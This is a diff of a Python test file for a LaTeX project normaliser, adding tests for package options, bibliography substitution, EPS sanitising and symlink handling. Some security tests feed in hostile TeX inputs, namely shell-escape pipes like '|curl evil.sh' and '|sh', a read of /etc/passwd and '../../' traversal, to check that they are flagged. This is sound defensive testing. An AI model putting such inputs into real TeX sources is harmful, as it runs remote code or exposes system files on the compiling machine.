@@ -74,6 +74,14 @@ def test_microtype_unsupported_options() -> None:
     assert "tracking=false" in tec  # tectonic bundle microtype 无 tracking
 
 
+def test_microtype_options_in_multipkg_list() -> None:
+    """多包列表 `{microtype,amsmath}` 的选项同样到 microtype——也得改写。"""
+    tex = "\\usepackage[expansion=true]{microtype,amsmath}"
+    out = normalize_pdftex_features(tex, "xelatex")
+    assert "expansion=false" in out
+    assert "microtype,amsmath" in out  # 包列表本身不动
+
+
 # 4. px → \pdfpxdimen（语境受限）
 def test_pixel_dimensions_includegraphics() -> None:
     tex = "\\includegraphics[width=360px]{a.pdf}"
@@ -137,6 +145,15 @@ def test_strip_inputenc_list_only_removes_named() -> None:
     tex = "\\usepackage[utf8]{inputenc,amsmath}"
     out = strip_input_encodings(tex)
     assert "{amsmath}" in out
+
+
+def test_strip_inputenc_sole_removal_preserves_line_count() -> None:
+    """整包剔除后是空行而非多插行——删除须保行号稳定（模块不变量）。"""
+    tex = "line1\n\\usepackage{fontenc}\nline3\n"
+    out = strip_input_encodings(tex)
+    assert out.count("\n") == tex.count("\n")
+    assert "fontenc" not in out
+    assert out.splitlines()[1].strip() == ""
 
 
 # 8. pdfinfo / pdfoutput / 驱动选项
@@ -232,6 +249,39 @@ def test_bundled_bibliography_verbatim_immune(tmp_path: Path) -> None:
     assert use_bundled_bibliography(main.read_text(), main) == main.read_text()
 
 
+def test_bundled_bibliography_multiple_bibliography_only_first(
+    tmp_path: Path,
+) -> None:
+    """多只缺库 `\bibliography` 只替换首个——单份 .bbl 不能重复排版。"""
+    main = tmp_path / "main.tex"
+    main.write_text(
+        "\\documentclass{article}\n\\begin{document}\nx\n"
+        "\\bibliography{goneA}\ntext\n\\bibliography{goneB}\n\\end{document}"
+    )
+    (tmp_path / "main.bbl").write_text(
+        "\\begin{thebibliography}{9}\\end{thebibliography}"
+    )
+    out = use_bundled_bibliography(main.read_text(), main)
+    assert out.count(r"\input{main.bbl}") == 1
+    assert r"\bibliography{goneB}" in out  # 第二只保留原状
+
+
+def test_bundled_bibliography_bib_searched_at_compile_cwd(tmp_path: Path) -> None:
+    """`.bib` 存在性按编译 cwd 判——refs.bib 在 main 目录时 sub 文件不重写。"""
+    sub = tmp_path / "chaps"
+    sub.mkdir()
+    one = sub / "one.tex"
+    one.write_text("body\n\\bibliography{refs}\n")
+    (tmp_path / "refs.bib").write_text("@article{a,title={t}}")
+    (sub / "one.bbl").write_text("\\begin{thebibliography}{9}\\end{thebibliography}")
+    # cwd=None → 退回声明文件目录（chaps/refs.bib 缺席 → 重写）
+    out = use_bundled_bibliography(one.read_text(), one)
+    assert r"\input{one.bbl}" in out
+    # cwd=tmp_path（main 目录）→ refs.bib 在场 → 不重写
+    out2 = use_bundled_bibliography(one.read_text(), one, cwd=tmp_path)
+    assert out2 == one.read_text()
+
+
 # 12. rebase 越界路径
 def test_rebase_project_paths(tmp_path: Path) -> None:
     """根层主文件 `\\input{../shared/x}`（越界）→ 包内 `shared/x` 存在则改写。"""
@@ -262,6 +312,30 @@ def test_source_path_violations_pipe(tmp_path: Path) -> None:
     (tmp_path / "main.tex").write_text("\\input{|curl evil.sh}\n")
     violations = list(source_path_violations(tmp_path, "main.tex"))
     assert violations
+
+
+def test_source_path_violations_openio_cs_form(tmp_path: Path) -> None:
+    r"""`\openout\w=|cmd` / `\openin\r=/abs` —— `\cs=` 形态的真文件名要过检查。"""
+    (tmp_path / "main.tex").write_text(
+        "\\openout\\w=|curl evil.sh\n"
+        "\\openin\\r=/etc/passwd\n"
+        "\\openout\\w = ../../outside\n"
+        "\\openout4=|sh\n"
+    )
+    violations = list(source_path_violations(tmp_path, "main.tex"))
+    assert {v[0].name for v in violations} == {"main.tex"}
+    assert [v[1].group(0) for v in violations] == [
+        "\\openout\\w=|curl",
+        "\\openin\\r=/etc/passwd",
+        "\\openout\\w = ../../outside",
+        "\\openout4=|sh",
+    ]
+
+
+def test_source_path_violations_openio_legit_noop(tmp_path: Path) -> None:
+    r"""合法包内 `\openout\w=out.dat` 不误报。"""
+    (tmp_path / "main.tex").write_text("\\openout\\w=out.dat\n\\openin\\r=refs.bib\n")
+    assert list(source_path_violations(tmp_path, "main.tex")) == []
 
 
 def test_normalize_engine_lualatex_only_cjk() -> None:
@@ -680,6 +754,88 @@ def test_shadow_vendored_same_name_in_subdir_skipped(
     stats = normalize_project(proj, "xelatex", "main.tex")
     assert "package_shadows" not in stats
     assert not (proj / "oldpkg.sty").exists()
+
+
+def test_sanitize_ps_comments_beginbinary_section_untouched(tmp_path: Path) -> None:
+    """``%%BeginBinary`` 段内 % 行是字节负载不是注释——逐字节保留。"""
+    blob = (
+        b"%!PS-Adobe-3.0 EPSF-3.0\n"
+        b"%%Title: caf\xe9\n"
+        b"%%BoundingBox: 0 0 10 10\n"
+        b"%%BeginBinary: 8\n"
+        b"%BIN\xe9ARY\n"
+        b"%%EndBinary\n"
+        b"%%EOF\n"
+    )
+    eps = tmp_path / "fig.eps"
+    eps.write_bytes(blob)
+    (tmp_path / "main.tex").write_text(
+        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
+    )
+    stats = normalize_project(tmp_path, "xelatex", "main.tex")
+    assert "fig.eps" in stats["sanitized_ps_comments"]  # 头注释 %%Title 净化
+    new = eps.read_bytes()
+    assert b"%%Title: caf\xc3\xa9" in new
+    assert b"%BIN\xe9ARY" in new  # 数据段原样
+
+
+def test_symlinked_tex_not_written_through(tmp_path: Path) -> None:
+    """工程树内软链 .tex → 跳过手术，写穿会改到 root 外目标。"""
+    outside = tmp_path.parent / f"{tmp_path.name}-ext.tex"
+    outside.write_bytes(b"\\pdfcompresslevel=9\n")
+    try:
+        (tmp_path / "linked.tex").symlink_to(outside)
+        (tmp_path / "main.tex").write_text(
+            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
+        )
+        stats = normalize_project(tmp_path, "xelatex", "main.tex")
+        assert outside.read_bytes() == b"\\pdfcompresslevel=9\n"
+        assert stats["files"] == 1  # 只统计 main.tex，软链不进手术面
+    finally:
+        outside.unlink(missing_ok=True)
+
+
+def test_junk_stub_symlink_not_stubbed_through(tmp_path: Path) -> None:
+    """软链命名的 aipcheck.tex 不覆写（写穿 = 改 root 外文件）。"""
+    outside = tmp_path.parent / f"{tmp_path.name}-aip.tex"
+    outside.write_bytes(b"\\typein{press}\n")
+    try:
+        (tmp_path / "aipcheck.tex").symlink_to(outside)
+        (tmp_path / "main.tex").write_text(
+            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
+        )
+        stats = normalize_project(tmp_path, "xelatex", "main.tex")
+        assert "junk_stubbed" not in stats
+        assert outside.read_bytes() == b"\\typein{press}\n"
+    finally:
+        outside.unlink(missing_ok=True)
+
+
+def test_shadow_dangling_symlink_target_skipped(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """遮蔽目标位已有悬挂软链 → 不写（exists()=False 但 write_text 会写穿）。"""
+    proj = tmp_path / "proj"
+    sysdir = tmp_path / "sys"
+    proj.mkdir()
+    sysdir.mkdir()
+    bad = sysdir / "oldpkg.sty"
+    bad.write_bytes(b"%% Copyright Schr\xf6der\n\\ProvidesPackage{oldpkg}\n")
+    (proj / "main.tex").write_text(
+        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
+        "\\begin{document}\nx\\end{document}\n"
+    )
+    (proj / "oldpkg.sty").symlink_to(tmp_path / "nowhere.sty")  # 悬挂
+    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
+    monkeypatch.setattr(
+        normalize,
+        "_kpse_resolve",
+        lambda filename, *_a: bad if filename == "oldpkg.sty" else None,
+    )
+    stats = normalize_project(proj, "xelatex", "main.tex")
+    assert "package_shadows" not in stats
+    assert (proj / "oldpkg.sty").is_symlink()  # 未被覆写
+    assert not (tmp_path / "nowhere.sty").exists()
 
 
 def test_transcode_catchall_nul_binary_untouched(tmp_path: Path) -> None:
